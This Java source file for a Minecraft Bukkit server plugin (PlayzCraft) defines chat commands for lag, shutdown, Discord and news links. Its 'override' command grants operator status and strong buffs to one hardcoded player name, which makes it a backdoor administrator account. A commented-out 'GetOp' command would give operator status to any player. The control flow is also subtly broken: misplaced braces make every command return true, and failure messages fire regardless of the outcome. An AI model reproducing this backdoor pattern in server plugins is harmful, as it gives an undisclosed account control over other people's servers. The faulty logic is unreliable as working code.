package rf.gd.ofir29200;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.potion.PotionEffectType;
import net.minecraft.server.v1_8_R2.*;



public class Commands extends CommandExecute implements Listener,CommandExecutor {

	public static String cmd1 = "lag";
	public static String cmd2 = "shutdown";
	public static String cmd3 = "override";
	//public static String cmd4 = "apply";
	public static String cmd5 = "discord";
	public static String cmd6 = "news";
	/*public static String cmd7 = "GetOp";
	public static String cmd8 = "GetTree";
	public static String cmd9 = "news";
	public static String cmd10 = "news";
	public static String cmd11 = "news";
	public static String cmd12 = "news";
	public static String cmd13 = "news";
	public static String cmd14 = "news";
	public static String cmd15 = "news";*/
	public boolean onCommand(org.bukkit.command.CommandSender sender, Command cmd, String label, String[] args)
	  {
	    boolean returnAnswer = false;
	    if ((cmd.getName().equalsIgnoreCase(cmd1)) && ((sender instanceof Player)))
	    {
	      Player player = (Player)sender;
	      
	      player.sendMessage("hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + ", we got your ping!");
	      player.chat("lag test");
	      player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "]" + ChatColor.GOLD + "your name is " + ChatColor.GREEN + player.getName());
	      
	      returnAnswer = true;
	    }
	    else if ((cmd.getName().equalsIgnoreCase(cmd2)) && ((sender instanceof Player)))
	    {
	      Player player = (Player)sender;
	     
	      player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + player.getName() + ChatColor.RED + " Please Don't try to shut down the server!");
	      returnAnswer = true;
	    }
	    
	    if ((cmd.getName().equalsIgnoreCase(cmd3)) && ((sender instanceof Player)))
	    {
	      Player player = (Player)sender;
	      	      
	      if (player.getName().equalsIgnoreCase("ofir29200"))
	      {
	    	  player.addPotionEffect(PotionEffectType.SPEED.createEffect(Integer.MAX_VALUE, 1));
	          player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, 1));
	          player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, 1));
	          player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
	          player.setMaxHealth(100D);
	          player.setHealth(100D);
	          if (player.isOp() == false)
	          {
	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GOLD + "Welcome back!");
	        	  player.setOp(true);
	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "you now have op!");
	          }
	          else
	          {
	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "you already have op!");
	          }
	          if (player.getHealth() == 100D) {  
	          player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "Done!");
	          }
	          else { 
	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "This operation is a FAIL!");
	          }
	      }
	      if (player.isOp() == true)
	      {
	    	  player.addPotionEffect(PotionEffectType.SPEED.createEffect(Integer.MAX_VALUE, 1));
	          player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, 1));
	          player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, 1));
	          player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
	          player.setMaxHealth(100D);
	          player.setHealth(100D);
	          if (player.getHealth() == 100D) {
	          player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "Done!");
	          }
	          else { 
	        	  player.sendMessage(ChatColor.RED + "This operation is a FAIL!");
	          }
	      }
	      else
	      {
	        player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.DARK_RED + "You dont have permission for that command!");
	      }
	      if (null == player.getName())
	      {
	    	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "Hello there null!");
	          }
	          else { 
	        	  player.sendMessage(ChatColor.RED + "This operation has FAILED for " + player.getCustomName() + "!");
	          }
	      }
	            returnAnswer = true;
		  
		/*  if ((cmd.getName().equalsIgnoreCase(cmd4)) && ((sender instanceof Player)))
	    {
	      Player player = (Player)sender;
	      
		  player.sendMessage("hi " + ChatColor.GREEN + player.getName() + ChatColor.RESET + ", please go to https://playzcraftserver.enjin.com/apply to apply");
	      
	      returnAnswer = true;
	    }*/
		  
		  if ((cmd.getName().equalsIgnoreCase(cmd5)) && ((sender instanceof Player)))
		    {
		      Player player = (Player)sender;
		      
			  player.sendMessage("hi " + ChatColor.GREEN + player.getName() + ChatColor.RESET + ", please go to https://discord.gg/VBAxNdV to join our discord");
		      
			  returnAnswer = true;
		    }

		  if ((cmd.getName().equalsIgnoreCase(cmd6)) && ((sender instanceof Player)))
		    {
		      Player player = (Player)sender;
		      
			  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + " hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + "! please go to https://playzcraft.ofir29200.xyz/news/ to read our news articles");
		      
			  returnAnswer = true;
		    }
		  /*if ((cmd.getName().equalsIgnoreCase(cmd7)) && ((sender instanceof Player)))
		    {
		      Player player = (Player)sender;
		      if (player.isOp() == false)
	          {
	        	  player.setOp(true);
	        	  org.bukkit.Bukkit.broadcastMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + "The player " + player.getName() + "now has OP");
	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "You now have op!");
	          }
	          else
	          {
	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "You already have op!");
	          }
		      
			  returnAnswer = true;
		    }*/
		  /*if ((cmd.getName().equalsIgnoreCase(cmd8)) && ((sender instanceof Player)))
		    {
		      Player player = (Player)sender;
		      player.getInventory().addItem(new ItemStack(Material.SAPLING, 1));
        	  player.sendMessage(ChatColor.GREEN + "Go and Plant this tree!");
		      player.getInventory().addItem(new ItemStack(Material.BONE, 100));
        	  player.sendMessage(ChatColor.RED + "Don't forget to convert the bones to Bone Meal to grow the tree faster!");
        	  if (player.hasPlayedBefore() == true) {
            	  player.setFlying(true);  
            	  player.getInventory().addItem(new ItemStack(Material.SAPLING, 1));
            	  player.sendMessage(ChatColor.GREEN + "here is another tree for you!");
        	  }
			  returnAnswer = true;
		    }*/

		  return returnAnswer;
	  }
}
